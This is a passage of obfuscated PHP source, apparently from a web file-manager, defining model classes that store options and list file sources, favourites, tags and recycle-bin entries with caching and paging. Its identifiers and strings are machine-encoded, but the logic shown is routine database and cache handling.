$ò¦„é¶Ø = Model($this->modelType)->get(!1, $this->optionType, !0); $å¼¡õÂÃ = array_values($ò¦„é¶Ø); if ($å¼¡õÂÃ && $å¼¡õÂÃ[0] && !is_array($å¼¡õÂÃ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ò¦„é¶Ø = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ò¦„é¶Ø) { return $à¢¸ó‚³ ? null : array(); } if (!$à¢¸ó‚³ && $à¢¸ó‚³ !== $Ã³œ¶ä®[228]) { $ò¦„é¶Ø = array_filter(array_values($ò¦„é¶Ø)); return array_sort_by($ò¦„é¶Ø, $Ô‚°Äü, $ú·¿™è, $Ã³œ¶ä®[487]); } return $ò¦„é¶Ø[$Ã³œ¶ä®[488] . $à¢¸ó‚³]; } public function insert($àÌÖÈ¦á) { $û¹­³± =& $_SERVER[œ—üé‹ê]; $àÌÖÈ¦á = array_field_key($àÌÖÈ¦á, $this->field); $³÷‹”©¤ = Model($this->modelType)->get($û¹­³±[489], $this->optionType . $û¹­³±[490]); $³÷‹”©¤ = $³÷‹”©¤ ? $³÷‹”©¤ : 0; $àÌÖÈ¦á[$û¹­³±[487]] = ++$³÷‹”©¤; $àÌÖÈ¦á[$û¹­³±[231]] = time(); $àÌÖÈ¦á[$û¹­³±[88]] = time(); Model($this->modelType)->set($û¹­³±[489], $³÷‹”©¤, $this->optionType . $û¹­³±[490]); Model($this->modelType)->set($û¹­³±[488] . $³÷‹”©¤, $àÌÖÈ¦á, $this->optionType); return $³÷‹”©¤; } public function insertArr($¸Ã‰ÀÚ) { $¡ãèŒí =& $_SERVER[œ—üé‹ê]; if (!$¸Ã‰ÀÚ || !is_array($¸Ã‰ÀÚ)) { return !1; } $­«¿€Ş² = Model($this->modelType)->get($¡ãèŒí[489], $this->optionType . $¡ãèŒí[490]); $­«¿€Ş² = $­«¿€Ş² ? $­«¿€Ş² : 0; $Š„´ÉĞ‡ = array(); foreach ($¸Ã‰ÀÚ as $Ú¶Ÿ­ßæ) { $µëÆŠ = array_field_key($Ú¶Ÿ­ßæ, $this->field); $µëÆŠ[$¡ãèŒí[487]] = ++$­«¿€Ş²; $µëÆŠ[$¡ãèŒí[231]] = time(); $µëÆŠ[$¡ãèŒí[88]] = time(); $Š„´ÉĞ‡[$¡ãèŒí[488] . $­«¿€Ş²] = $µëÆŠ; } Model($this->modelType)->set($¡ãèŒí[489], $­«¿€Ş², $this->optionType . $¡ãèŒí[490]); Model($this->modelType)->set($Š„´ÉĞ‡, !1, $this->optionType); return $­«¿€Ş²; } public function update($¨×£Ä´š, $úÔÂ«·“) { $‘ø¶¨íÉ =& $_SERVER[œ—üé‹ê]; $úÔÂ«·“ = array_field_key($úÔÂ«·“, $this->field); $ãâ›îıÇ = $this->listData($¨×£Ä´š); if (!$ãâ›îıÇ || !$¨×£Ä´š) { return !1; } $úÔÂ«·“ = array_merge($ãâ›îıÇ, $úÔÂ«·“); $úÔÂ«·“[$‘ø¶¨íÉ[88]] = time(); return Model($this->modelType)->set($‘ø¶¨íÉ[488] . $¨×£Ä´š, $úÔÂ«·“, $this->optionType); } public function remove($Èñá®¾Ğ) { if (!$Èñá®¾Ğ) { return !1; } return Model($this->modelType)->remove($_SERVER[œ—üé‹ê][488] . $Èñá®¾Ğ, $this->optionType); } public function removeArr($®äøÛÑø) { if (!$®äøÛÑø) { return !0; } $³½ÌÉÔì = array(); foreach ($®äøÛÑø as $áşÎ‰£Ñ) { $³½ÌÉÔì[] = $_SERVER[œ—üé‹ê][488] . $áşÎ‰£Ñ; } return Model($this->modelType)->removeArr($³½ÌÉÔì, $this->optionType); } public function clear() { $øÇ§‰œ¤ =& $_SERVER[œ—üé‹ê]; Model($this->modelType)->remove($øÇ§‰œ¤[489], $this->optionType . $øÇ§‰œ¤[490]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ËéƒÖ³, $Í’Î’º) { if (!$Í’Î’º) { return !1; } $øÓ¢ç´» = $this->listData(); $øÓ¢ç´» = array_to_keyvalue($øÓ¢ç´», $ËéƒÖ³); return isset($øÓ¢ç´»[$Í’Î’º]) ? $øÓ¢ç´»[$Í’Î’º] : !1; } public function findByName($Å¨’œŸ) { return $this->findByKey($_SERVER[œ—üé‹ê][32], $Å¨’œŸ); } protected function resetData($ÂĞ“­›) { $ğËİÌÄ” =& $_SERVER[œ—üé‹ê]; if (!$ÂĞ“­›) { return; } $ÂĞ“­› = is_array($ÂĞ“­›) ? $ÂĞ“­› : array(); $šÍèÑ¯ = array(); for ($É­øªğÕ = 0; $É­øªğÕ < count($ÂĞ“­›); $É­øªğÕ++) { if (!$ÂĞ“­›[$É­øªğÕ] || !$ÂĞ“­›[$É­øªğÕ][$ğËİÌÄ”[487]]) { continue; } $šÍèÑ¯[$ğËİÌÄ”[488] . $ÂĞ“­›[$É­øªğÕ][$ğËİÌÄ”[487]]] = $ÂĞ“­›[$É­øªğÕ]; } return Model($this->modelType)->set($šÍèÑ¯, !1, $this->optionType); } private function getAutoName($âÈµß”â) { $—õü¸Ê« = array_to_keyvalue($this->listData(), $_SERVER[œ—üé‹ê][32]); if (!$—õü¸Ê« || !isset($—õü¸Ê«[$âÈµß”â])) { return $âÈµß”â; } for ($æç‚ŒÜ = 1; $æç‚ŒÜ < count($—õü¸Ê«); $æç‚ŒÜ++) { $„åİÈóÂ = $âÈµß”â . "\x28{$æç‚ŒÜ}\51"; if (!isset($—õü¸Ê«[$„åİÈóÂ])) { return $„åİÈóÂ; } } return $„åİÈóÂ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($äÜ¬ ÃÌ = false, $­è¯ĞÊ¨ = '', $åƒÌ¦‚ = false, $‚ÂÔ—Œ = true) { $ËáËÏÍ© =& $_SERVER[œ—üé‹ê]; $çÇèœ˜ = $this->cacheGet($­è¯ĞÊ¨); $°•úûš„ = $this->optionDefault($­è¯ĞÊ¨); $°•úûš„ = is_array($°•úûš„) ? $°•úûš„ : array(); if (is_array($çÇèœ˜)) { if ($‚ÂÔ—Œ) { $çÇèœ˜ = array_merge($°•úûš„, $çÇèœ˜); } return $äÜ¬ ÃÌ ? isset($çÇèœ˜[$äÜ¬ ÃÌ]) ? $çÇèœ˜[$äÜ¬ ÃÌ] : null : $çÇèœ˜; } $ŠğáåşÜ = $this->filterWhere(array($ËáËÏÍ©[33] => $­è¯ĞÊ¨)); $çÇèœ˜ = $this->where($ŠğáåşÜ)->select(); $çÇèœ˜ = array_to_keyvalue($çÇèœ˜, $ËáËÏÍ©[95], $ËáËÏÍ©[451]); foreach ($çÇèœ˜ as $‰ƒö¨æÑ => $¬È•¿å°) { if ($åƒÌ¦‚ || in_array($‰ƒö¨æÑ, $this->jsonField)) { $çÇèœ˜[$‰ƒö¨æÑ] = json_decode($¬È•¿å°, !0); } } $this->cacheSet($­è¯ĞÊ¨, $çÇèœ˜); if ($‚ÂÔ—Œ) { $çÇèœ˜ = array_merge($°•úûš„, $çÇèœ˜); } return $äÜ¬ ÃÌ ? $çÇèœ˜[$äÜ¬ ÃÌ] : $çÇèœ˜; } public function set($¯ÖÏéŸ¢, $Û¾±çÖ = false, $æõŸïÒÃ = '') { $ÊßÊëÈ =& $_SERVER[œ—üé‹ê]; if (!$¯ÖÏéŸ¢) { return !0; } $øòÜÉ°‰ = $this->get(!1, $æõŸïÒÃ, !1, !1); $øòÜÉ°‰ = is_array($øòÜÉ°‰) ? $øòÜÉ°‰ : array(); $Ç´²¬ı¢ = array(); $®‹€Ã§æ = array(); $Èµ¿Éõ™ = array(); $²µíº¹û = is_array($¯ÖÏéŸ¢) ? $¯ÖÏéŸ¢ : array($¯ÖÏéŸ¢ => $Û¾±çÖ); $¬ä¸Ğ¡ê = $this->filterWhere(array($ÊßÊëÈ[33] => $æõŸïÒÃ)); foreach ($²µíº¹û as $åÉç”Ş® => $—“…€áÖ) { if (is_array($—“…€áÖ)) { $—“…€áÖ = json_encode_force($—“…€áÖ); } $this->checkLength($—“…€áÖ, !1, $this->tableName . $ÊßÊëÈ[4] . $¯ÖÏéŸ¢); $—“…€áÖ = self::textEncode($—“…€áÖ); if (array_key_exists($åÉç”Ş®, $øòÜÉ°‰)) { $Ç¬¿Î = is_array($øòÜÉ°‰[$åÉç”Ş®]) ? json_encode_force($øòÜÉ°‰[$åÉç”Ş®]) : $øòÜÉ°‰[$åÉç”Ş®]; $Ç¬¿Î = self::textEncode($Ç¬¿Î); if ($Ç¬¿Î === $—“…€áÖ) { continue; } $®‹€Ã§æ[] = array($ÊßÊëÈ[95], $åÉç”Ş®, $ÊßÊëÈ[451], $—“…€áÖ, $ÊßÊëÈ[88], time()); } else { $ìÕğ¾ÈÒ = array($ÊßÊëÈ[33] => $æõŸïÒÃ, $ÊßÊëÈ[95] => $åÉç”Ş®, $ÊßÊëÈ[451] => $—“…€áÖ); $Ç´²¬ı¢[] = $this->filterWhere($ìÕğ¾ÈÒ); } } if (!$Ç´²¬ı¢ && !$®‹€Ã§æ) { return !0; } $this->cacheRemove($æõŸïÒÃ); $ÔÇÏ´÷å = $this->cacheKey($ÊßÊëÈ[491]); CacheLock::lock($ÔÇÏ´÷å); if ($Ç´²¬ı¢) { $this->addAll($Ç´²¬ı¢); } if ($®‹€Ã§æ) { $this->saveAll($®‹€Ã§æ, $¬ä¸Ğ¡ê); } CacheLock::unlock($ÔÇÏ´÷å); return !0; } protected function optionDefault($ù”Ûõ™Ÿ = '') { return !1; } public function setDeep($Ïõ™éçÂ, $œÎŞ¤ß = false, $ğ¼¹°Œ° = '') { $±öôÎß¿ = explode($_SERVER[œ—üé‹ê][10], $Ïõ™éçÂ); $ç©•Ä = $this->get(); array_set_value($ç©•Ä, $Ïõ™éçÂ, $œÎŞ¤ß); $this->set($±öôÎß¿[0], $ç©•Ä[$±öôÎß¿[0]], $ğ¼¹°Œ°); } public function remove($ÛËºå¤ù, $½¿ú¬š“ = '') { $àÍêÏ± =& $_SERVER[œ—üé‹ê]; $this->cacheRemove($½¿ú¬š“); $øí ü = $this->filterWhere(array($àÍêÏ±[95] => $ÛËºå¤ù, $àÍêÏ±[33] => $½¿ú¬š“)); if (is_null($ÛËºå¤ù)) { unset($øí ü[$àÍêÏ±[95]]); } return $this->where($øí ü)->delete(); } public function removeArr($›„¯Å°, $¼†¦íå¬ = '') { $¤Ùûë¿² =& $_SERVER[œ—üé‹ê]; if (!$›„¯Å° || !is_array($›„¯Å°)) { return !0; } $this->cacheRemove($¼†¦íå¬); $õÉÇ¥êú = $this->filterWhere(array($¤Ùûë¿²[33] => $¼†¦íå¬, $¤Ùûë¿²[95] => array($¤Ùûë¿²[7], $›„¯Å°))); return $this->where($õÉÇ¥êú)->delete(); } public function cacheSet($ÑŞÕ…Ø‚, $–Éâ© = false) { return Cache::set($this->cacheKey($ÑŞÕ…Ø‚), $–Éâ©); } public function cacheGet($¼ëø ìˆ) { return Cache::get($this->cacheKey($¼ëø ìˆ)); } public function cacheRemove($¬ÁÜ á) { return Cache::remove($this->cacheKey($¬ÁÜ á)); } protected function filterWhere($ìšÅøâ) { return $ìšÅøâ; } protected function cacheKey($ÄŠ³›”¢) { return $ÄŠ³›”¢; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\162\x63\145"; protected $tableMeta = array("\164\x61\142\154\145\x4e\x61\x6d\x65" => "\151\x6f\x5f\x73\x6f\x75\x72\x63\x65\x5f\155\145\164\141", "\x6d\145\x74\x61\x46\151\145\154\x64" => "\x73\x6f\165\x72\143\145\111\104"); protected $dataAuto = array(array("\155\157\144\x69\x66\171\124\151\x6d\145", "\x74\x69\x6d\145", "\151\156\x73\x65\x72\x74", "\146\165\156\143\164\151\x6f\156"), array("\143\162\x65\x61\x74\x65\x54\151\155\145", "\x74\151\x6d\145", "\151\156\x73\145\x72\164", "\146\165\156\x63\x74\151\x6f\x6e"), array("\x76\151\145\167\x54\x69\155\145", "\x74\x69\155\x65", "\x69\156\x73\145\x72\x74", "\146\x75\x6e\143\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Øşä§ë) { return $this->listSource(array($_SERVER[œ—üé‹ê][492] => $Øşä§ë)); } public function typeName($®ÌüäÜà) { static $ÀïÑÁ€û = array(self::TYPE_SYSTEM => "\x73\171\x73\164\x65\x6d", self::TYPE_USER => "\x75\163\x65\x72", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $ÀïÑÁ€û[$®ÌüäÜà . $_SERVER[œ—üé‹ê][12]]; } public function sourceListInfo($îá©º’, $İ¢íòÀº = false) { $²öÁ¢â¬ =& $_SERVER[œ—üé‹ê]; $îá©º’ = $îá©º’ ? $îá©º’ : array(); $îá©º’ = array_filter(array_unique($îá©º’)); if (!$îá©º’) { return array(); } $Ù—äæ‰ª = $this->where(array($²öÁ¢â¬[191] => array($²öÁ¢â¬[7], $îá©º’)))->select(); $this->_listDataApply($Ù—äæ‰ª, $İ¢íòÀº); return array_to_keyvalue($Ù—äæ‰ª, $²öÁ¢â¬[191]); } public function pathInfoFilter(&$ìàîö) { $ìÒ¼«½Ö =& $_SERVER[œ—üé‹ê]; static $æŞ¿èŒÛ = false; static $’ÕŸ½ã = false; static $£¤‘¸şü = false; if (!$æŞ¿èŒÛ) { $ÆÅ«˜¸ = $ìÒ¼«½Ö[493]; $ÆÅ«˜¸ .= $ìÒ¼«½Ö[494]; $ÆÅ«˜¸ .= $ìÒ¼«½Ö[495]; $åÔù–© = $ìÒ¼«½Ö[496]; $ÅÒéİâÁ = explode($ìÒ¼«½Ö[50], $åÔù–©); $æŞ¿èŒÛ = explode($ìÒ¼«½Ö[50], $ÆÅ«˜¸); $’ÕŸ½ã = array(); foreach ($æŞ¿èŒÛ as $Œ±¶çù«) { if (in_array($Œ±¶çù«, $ÅÒéİâÁ)) { continue; } $’ÕŸ½ã[] = $Œ±¶çù«; } $£¤‘¸şü = explode($ìÒ¼«½Ö[50], $ìÒ¼«½Ö[497]); } foreach ($£¤‘¸şü as $×§Ô’æ–) { if (isset($ìàîö[$×§Ô’æ–])) { $ìàîö[$×§Ô’æ–] = intval($ìàîö[$×§Ô’æ–]); } } $ìàîö[$ìÒ¼«½Ö[87]] = $ìÒ¼«½Ö[498] . $ìàîö[$ìÒ¼«½Ö[191]] . $ìÒ¼«½Ö[499]; $ìàîö[$ìÒ¼«½Ö[33]] = $ìàîö[$ìÒ¼«½Ö[500]] == 1 ? $ìÒ¼«½Ö[78] : $ìÒ¼«½Ö[230]; $ìàîö[$ìÒ¼«½Ö[188]] = $this->typeName($ìàîö[$ìÒ¼«½Ö[188]]); if ($ìàîö[$ìÒ¼«½Ö[500]] != 1) { $ìàîö[$ìÒ¼«½Ö[166]] = $ìàîö[$ìÒ¼«½Ö[501]]; unset($ìàîö[$ìÒ¼«½Ö[501]]); } $è©ğ–¶ç = $æŞ¿èŒÛ; if (isset($ìàîö[$ìÒ¼«½Ö[502]]) && $ìàîö[$ìÒ¼«½Ö[502]][$ìÒ¼«½Ö[503]] == -1) { $è©ğ–¶ç = $’ÕŸ½ã; } $ìàîö = array_field_key($ìàîö, $è©ğ–¶ç); return $ìàîö; } public function listUserFav() { $•ƒ½™Ä‘ =& $_SERVER[œ—üé‹ê]; $ÂÜŸ˜éÏ = Model($•ƒ½™Ä‘[504])->listData(); $¸è‰Â– = array_filter_by_field($ÂÜŸ˜éÏ, $•ƒ½™Ä‘[33], $•ƒ½™Ä‘[505]); $¸è‰Â– = array_to_keyvalue($¸è‰Â–, $•ƒ½™Ä‘[12], $•ƒ½™Ä‘[87]); if ($¸è‰Â–) { $ò‰â§ÇÜ = $this->listSource(array($•ƒ½™Ä‘[506] => array($•ƒ½™Ä‘[507], $¸è‰Â–))); } $ò‰â§ÇÜ = array_to_keyvalue($ò‰â§ÇÜ[$•ƒ½™Ä‘[446]], $•ƒ½™Ä‘[191]); foreach ($ÂÜŸ˜éÏ as &$Ì½Ûï¨è) { $Ì½Ûï¨è = array($•ƒ½™Ä‘[508] => $Ì½Ûï¨è[$•ƒ½™Ä‘[487]], $•ƒ½™Ä‘[509] => $Ì½Ûï¨è[$•ƒ½™Ä‘[32]], $•ƒ½™Ä‘[510] => $Ì½Ûï¨è[$•ƒ½™Ä‘[87]], $•ƒ½™Ä‘[511] => $Ì½Ûï¨è[$•ƒ½™Ä‘[33]], $•ƒ½™Ä‘[512] => $Ì½Ûï¨è[$•ƒ½™Ä‘[231]], $•ƒ½™Ä‘[513] => $Ì½Ûï¨è[$•ƒ½™Ä‘[88]]); if ($Ì½Ûï¨è[$•ƒ½™Ä‘[33]] == $•ƒ½™Ä‘[505] && $ò‰â§ÇÜ[$Ì½Ûï¨è[$•ƒ½™Ä‘[87]]]) { $Ì½Ûï¨è[$•ƒ½™Ä‘[90]] = $ò‰â§ÇÜ[$Ì½Ûï¨è[$•ƒ½™Ä‘[87]]]; } } unset($Ì½Ûï¨è); return $ÂÜŸ˜éÏ; } public function listUserTag($âãã‹öğ) { $˜—†öµ¤ =& $_SERVER[œ—üé‹ê]; if ($âãã‹öğ && !is_array($âãã‹öğ)) { $âãã‹öğ = array($âãã‹öğ); } $àß·¹ˆ = Model($˜—†öµ¤[514])->listData(); $ëÑÙö©‰ = array(); $’¤±ş¤ = array(); foreach ($àß·¹ˆ as $âÂš Ë½) { $Çæúá¾ = $âÂš Ë½[$˜—†öµ¤[87]]; if (!$Çæúá¾) { continue; } if (!isset($’¤±ş¤[$Çæúá¾])) { $’¤±ş¤[$Çæúá¾] = array(); } $’¤±ş¤[$Çæúá¾][] = $âÂš Ë½[$˜—†öµ¤[515]]; $ëÑÙö©‰[$âÂš Ë½[$˜—†öµ¤[87]]] = $âÂš Ë½; } $¥’¸ü»² = array(); $ùÜÉ´’ = array(); $È·öÄÓ» = array(); foreach ($’¤±ş¤ as $Ù†­¨òí => $îï‡â¦Ş) { $øâ‘óàÀ = !0; if (!$âãã‹öğ) { $¥’¸ü»²[] = $Ù†­¨òí; continue; } foreach ($âãã‹öğ as $˜“Ú¨ä) { if (!in_array($˜“Ú¨ä, $îï‡â¦Ş)) { $øâ‘óàÀ = !1; break; } } if (!$øâ‘óàÀ) { continue; } if (!is_numeric($Ù†­¨òí)) { $˜“¾…ÔÎ = $ëÑÙö©‰[$Ù†­¨òí]; $°İÕß¹ñ = array($˜—†öµ¤[32] => $˜“¾…ÔÎ[$˜—†öµ¤[32]], $˜—†öµ¤[87] => $˜“¾…ÔÎ[$˜—†öµ¤[87]], $˜—†öµ¤[33] => $˜“¾…ÔÎ[$˜—†öµ¤[33]], $˜—†öµ¤[90] => array($˜—†öµ¤[516] => 1), $˜—†öµ¤[232] => !0); if ($˜“¾…ÔÎ[$˜—†öµ¤[33]] == $˜—†öµ¤[230]) { $È·öÄÓ»[] = $°İÕß¹ñ; } if ($˜“¾…ÔÎ[$˜—†öµ¤[33]] == $˜—†öµ¤[78]) { $ùÜÉ´’[] = $°İÕß¹ñ; } continue; } $¥’¸ü»²[] = $Ù†­¨òí; } if ($¥’¸ü»²) { $øáÏëÈ† = $this->listSource(array($˜—†öµ¤[506] => array($˜—†öµ¤[507], $¥’¸ü»²))); } $øáÏëÈ† = $øáÏëÈ† ? $øáÏëÈ† : array($˜—†öµ¤[85] => array(), $˜—†öµ¤[86] => array()); $øáÏëÈ†[$˜—†öµ¤[85]] = array_merge($øáÏëÈ†[$˜—†öµ¤[85]], $ùÜÉ´’); $øáÏëÈ†[$˜—†öµ¤[86]] = array_merge($øáÏëÈ†[$˜—†öµ¤[86]], $È·öÄÓ»); if (isset($øáÏëÈ†[$˜—†öµ¤[443]]) && count($¥’¸ü»²) == $øáÏëÈ†[$˜—†öµ¤[443]][$˜—†öµ¤[444]]) { return $øáÏëÈ†; } $©ÎšÌî× = array(); $ÜôÓÍñµ = array_to_keyvalue($øáÏëÈ†[$˜—†öµ¤[85]], $˜—†öµ¤[12], $˜—†öµ¤[191]); $ŸÎãú¶¹ = array_to_keyvalue($øáÏëÈ†[$˜—†öµ¤[86]], $˜—†öµ¤[12], $˜—†öµ¤[191]); $Úü¤Õää = array_merge($ŸÎãú¶¹, $ÜôÓÍñµ); foreach ($¥’¸ü»² as $Çæúá¾) { if (!in_array($Çæúá¾, $Úü¤Õää)) { $©ÎšÌî×[] = $Çæúá¾; } } if ($©ÎšÌî×) { Model($˜—†öµ¤[517])->removeBySource($©ÎšÌî×); } return $øáÏëÈ†; } public function listUserRecycle() { $……İÌëı =& $_SERVER[œ—üé‹ê]; $èôŸ£ƒ = Model($……İÌëı[518])->listData(); if (!$èôŸ£ƒ) { return array(); } $™ßşåŸã = array($……İÌëı[506] => array($……İÌëı[507], $èôŸ£ƒ), $……İÌëı[519] => 1); return $this->listSource($™ßşåŸã); } public function listSource($Šà€¸ÍÂ, $Ö‹¯íê = 3000, $™š¥•®‚ = false) { $¢»Ò”Ì =& $_SERVER[œ—üé‹ê]; if (!isset($Šà€¸ÍÂ[$¢»Ò”Ì[520]])) { $Šà€¸ÍÂ[$¢»Ò”Ì[520]] = 0; } if (isset($Šà€¸ÍÂ[$¢»Ò”Ì[190]]) && $Šà€¸ÍÂ[$¢»Ò”Ì[190]] == $¢»Ò”Ì[228]) { $Šà€¸ÍÂ[$¢»Ò”Ì[501]] = array($¢»Ò”Ì[464], $¢»Ò”Ì[12]); } if (isset($Šà€¸ÍÂ[$¢»Ò”Ì[190]])) { $Šà€¸ÍÂ[$¢»Ò”Ì[190]] = intval($Šà€¸ÍÂ[$¢»Ò”Ì[190]]); } $™¢Ù¡² = $¢»Ò”Ì[521]; $±ÆÀÔÄË = $this->field($™¢Ù¡²)->_makeOrder()->where($Šà€¸ÍÂ)->selectPage($Ö‹¯íê); $this->_listPageCheck($±ÆÀÔÄË, $™¢Ù¡², $Šà€¸ÍÂ); $this->_listDataApply($±ÆÀÔÄË[$¢»Ò”Ì[446]], $™š¥•®‚); $this->_listMake($±ÆÀÔÄË); return $±ÆÀÔÄË; } private function _listPageCheck(&$„ĞÑü¤ë, $ùä‹ôâÂ, $©Ì£¤¡) { $¬‡ñğ¿ =& $_SERVER[œ—üé‹ê]; if (!is_array($„ĞÑü¤ë[$¬‡ñğ¿[443]])) { return; } $Îä¥ëºÜ = $„ĞÑü¤ë[$¬‡ñğ¿[443]]; if ($Îä¥ëºÜ[$¬‡ñğ¿[445]] <= 1) { return; } if ($Îä¥ëºÜ[$¬‡ñğ¿[444]] >= 100000) { return; } if (Model($¬‡ñğ¿[522])->get($¬‡ñğ¿[523]) != $¬‡ñğ¿[524]) { return; } $ùä‹ôâÂ = str_replace(array($¬‡ñğ¿[53], $¬‡ñğ¿[417], $¬‡ñğ¿[285]), $¬‡ñğ¿[12], $ùä‹ôâÂ); $ùä‹ôâÂ = $¬‡ñğ¿[525] . str_replace($¬‡ñğ¿[50], $¬‡ñğ¿[526], $ùä‹ôâÂ) . $¬‡ñğ¿[527]; $ÃÉ¦ÔÀÇ = $¬‡ñğ¿[528]; $ÃÉ¦ÔÀÇ = $ÃÉ¦ÔÀÇ . $¬‡ñğ¿[529]; $ß „€¦¿ = $Îä¥ëºÜ[$¬‡ñğ¿[439]] * ($Îä¥ëºÜ[$¬‡ñğ¿[428]] - 1) . $¬‡ñğ¿[50] . $Îä¥ëºÜ[$¬‡ñğ¿[439]]; $‡æ«øš = $this->_makeOrder(!0); $ š“ß„‡ = $¬‡ñğ¿[525] . str_replace($¬‡ñğ¿[50], $¬‡ñğ¿[526], $‡æ«øš[0]); if (strpos($ š“ß„‡, $¬‡ñğ¿[530])) { $ š“ß„‡ = str_replace($¬‡ñğ¿[530], $¬‡ñğ¿[531], $ š“ß„‡); } else { $ š“ß„‡ .= $¬‡ñğ¿[532] . $‡æ«øš[1]; } $¥ƒáâ¾ = array(); foreach ($©Ì£¤¡ as $¨÷™òª‘ => $Áì—ñÅğ) { $¥ƒáâ¾[$¬‡ñğ¿[525] . $¨÷™òª‘] = $Áì—ñÅğ; } $this->alias($¬‡ñğ¿[533])->field($ùä‹ôâÂ)->limit($ß „€¦¿)->order($ š“ß„‡); $ç—ÃçÖ» = $this->join($ÃÉ¦ÔÀÇ)->where($¥ƒáâ¾)->select(); if ($ç—ÃçÖ») { $„ĞÑü¤ë[$¬‡ñğ¿[446]] = $ç—ÃçÖ»; } } protected function _makeOrder($ÃÄÃŒ÷é = false) { $ÄÅ¹¼ƒ =& $_SERVER[œ—üé‹ê]; $Ñ²¦ãñ÷ = Model($ÄÅ¹¼ƒ[534])->get($ÄÅ¹¼ƒ[535]); $æ„¡öº‚ = Model($ÄÅ¹¼ƒ[534])->get($ÄÅ¹¼ƒ[536]); $½áó®®ö = array($ÄÅ¹¼ƒ[537] => $ÄÅ¹¼ƒ[538], $ÄÅ¹¼ƒ[539] => $ÄÅ¹¼ƒ[540]); $î½ıª÷« = array($ÄÅ¹¼ƒ[32] => $ÄÅ¹¼ƒ[32], $ÄÅ¹¼ƒ[79] => $ÄÅ¹¼ƒ[79], $ÄÅ¹¼ƒ[166] => $ÄÅ¹¼ƒ[501], $ÄÅ¹¼ƒ[541] => $ÄÅ¹¼ƒ[541], $ÄÅ¹¼ƒ[542] => $ÄÅ¹¼ƒ[543], $ÄÅ¹¼ƒ[231] => $ÄÅ¹¼ƒ[231], $ÄÅ¹¼ƒ[88] => $ÄÅ¹¼ƒ[88]); $ÎÎû™€ = Input::get($ÄÅ¹¼ƒ[544], $ÄÅ¹¼ƒ[7], $Ñ²¦ãñ÷, array_keys($î½ıª÷«)); $æˆˆ¡×ê = Input::get($ÄÅ¹¼ƒ[545], $ÄÅ¹¼ƒ[7], $æ„¡öº‚, array_keys($½áó®®ö)); if (!in_array($ÎÎû™€, array_keys($î½ıª÷«))) { $ÎÎû™€ = $ÄÅ¹¼ƒ[32]; } if (!in_array($æˆˆ¡×ê, array_keys($½áó®®ö))) { $ÎÎû™€ = $ÄÅ¹¼ƒ[537]; } if ($ÎÎû™€ == $ÄÅ¹¼ƒ[32]) { } $ğ¹‚×‰¼ = $ÄÅ¹¼ƒ[546] . $î½ıª÷«[$ÎÎû™€] . $ÄÅ¹¼ƒ[53] . $½áó®®ö[$æˆˆ¡×ê]; $ğ¹‚×‰¼ = rtrim(trim($ğ¹‚×‰¼), $ÄÅ¹¼ƒ[50]); if ($ÃÄÃŒ÷é) { return array($ğ¹‚×‰¼, $½áó®®ö[$æˆˆ¡×ê]); } return $this->order($ğ¹‚×‰¼); } protected function _listDataApplyItem($–¶»ÀÕ, $”—¤ûøı = false) { $»óĞÍâ = array($–¶»ÀÕ); $this->_listDataApply($»óĞÍâ, $”—¤ûøı); return $»óĞÍâ[0]; } protected function _listDataApply(&$Ì‚è¨×·, $äê¢õØ¢ = false) { $ûÑ±Íù =& $_SERVER[œ—üé‹ê]; if (!$Ì‚è¨×·) { $Ì‚è¨×· = array(); return; } $Ê¤ˆÔ±ş = array_to_keyvalue($Ì‚è¨×·, $ûÑ±Íù[12], $ûÑ±Íù[191]); $Ê¤ˆÔ±ş = array_unique($Ê¤ˆÔ±ş); $Ê¤ˆÔ±ş = array_to_int($Ê¤ˆÔ±ş); $this->_listSourceCache($Ì‚è¨×·); if (!$äê¢õØ¢) { $this->_listAppendMeta($Ì‚è¨×·, $Ê¤ˆÔ±ş); $this->_listAppendFileMeta($Ì‚è¨×·, $Ê¤ˆÔ±ş); $this->_listAppendChildren($Ì‚è¨×·, $Ê¤ˆÔ±ş); } $this->_listAppendPath($Ì‚è¨×·); $this->_listAppendAuth($Ì‚è¨×·); $this->_listAppendSourceInfo($Ì‚è¨×·, $Ê¤ˆÔ±ş); $this->_listAppendUser($Ì‚è¨×·); $this->_listFilterInfo($Ì‚è¨×·, $äê¢õØ¢); $this->_listAppendAuthSecret($Ì‚è¨×·); } protected function _listSourceCache($­øÈÑ’À) { $Ÿø½»Ğğ =& $_SERVER[œ—üé‹ê]; foreach ($­øÈÑ’À as $Ñ¡óàˆâ) { self::$cacheSourceInfo[$Ÿø½»Ğğ[547] . $Ñ¡óàˆâ[$Ÿø½»Ğğ[191]]] = $Ñ¡óàˆâ; } } protected function _listFilterInfo(&$ŞÈŞ©Îã, $›æß†ôš = false) { $–Ê™ßìË =& $_SERVER[œ—üé‹ê]; foreach ($ŞÈŞ©Îã as &$ò™ŞŠü ) { $ò™ŞŠü  = $this->pathInfoFilter($ò™ŞŠü ); self::$cachePathInfo[$–Ê™ßìË[548] . intval($›æß†ôš) . $–Ê™ßìË[476] . $ò™ŞŠü [$–Ê™ßìË[191]]] = $ò™ŞŠü ; } unset($ò™ŞŠü ); } protected function _listMake(&$ÂŸ×²¼Œ) { $ƒ—²È÷Í =& $_SERVER[œ—üé‹ê]; $ÂŸ×²¼Œ[$ƒ—²È÷Í[85]] = array(); $ÂŸ×²¼Œ[$ƒ—²È÷Í[86]] = array(); foreach ($ÂŸ×²¼Œ[$ƒ—²È÷Í[446]] as $üèå…çÖ) { $—¨ÅëÁ‡ = $üèå…çÖ[$ƒ—²È÷Í[500]] == 1 ? $ƒ—²È÷Í[85] : $ƒ—²È÷Í[86]; $ÂŸ×²¼Œ[$—¨ÅëÁ‡][] = $üèå…çÖ; } unset($ÂŸ×²¼Œ[$ƒ—²È÷Í[446]]); } protected function _listAppendMeta(&$²õ®ÎÕå, $ë“Ş½¶¯) { $äÓ•Í·ç =& $_SERVER[œ—üé‹ê]; $Ù¨ª³€ã = array($äÓ•Í·ç[506] => array($äÓ•Í·ç[507], $ë“Ş½¶¯)); 